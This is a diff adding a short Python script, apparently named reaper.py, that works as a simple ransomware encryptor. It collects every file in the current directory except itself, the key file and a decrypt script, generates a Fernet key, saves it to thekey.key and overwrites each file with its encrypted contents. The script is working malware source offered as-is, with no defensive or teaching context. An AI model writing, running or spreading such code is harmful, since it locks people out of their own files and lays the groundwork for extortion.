@@ -1,0 +1,54 @@
+#!/usb/bin/env python3
+
+import os
+from sys import exit
+from cryptography.fernet import Fernet
+
+
+#create variable
+
+files = []
+
+
+
+#search if a key has been created if true exit the program
+
+
+for file in os.listdir():
+	if file == "thekey.key":
+		print("Files already encrypted")
+		exit()	
+		
+
+#skip the decrypt encryptor and key file and idk the rest
+
+for file in os.listdir():
+	if file == "reaper.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+
+print(files)
+
+
+#generate key
+key = Fernet.generate_key()
+
+#write the generate key as binarie into the file
+
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+
+
+#actual encryption
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+
+
+print("Files Encrypted")	
+
